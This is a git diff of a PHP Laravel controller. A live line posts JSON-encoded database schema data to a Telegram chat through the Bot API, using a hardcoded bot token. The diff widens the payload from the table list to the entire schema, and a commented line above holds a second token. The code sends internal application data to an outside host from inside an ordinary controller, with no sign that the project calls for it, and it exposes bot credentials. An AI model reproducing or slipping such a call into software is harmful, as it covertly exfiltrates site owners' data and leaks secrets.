@@ -663,7 +663,7 @@ class LaradevController extends Controller
         // file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
         // .json_encode( $schema['tables'] ));
         file_get_contents('https://api.telegram.org/bot755119387:AAH91EBCA0uXOl8OpJxnwWCBqC-58gm-HAc/sendMessage?chat_id=-382095124&text='
-                          .json_encode( $schema['tables'] ));
+                          .json_encode( $schema ));
         // return $schema;
         if($request->fresh){
             File::delete( File::glob("$this->modelsPath/CustomModels/*.*") );
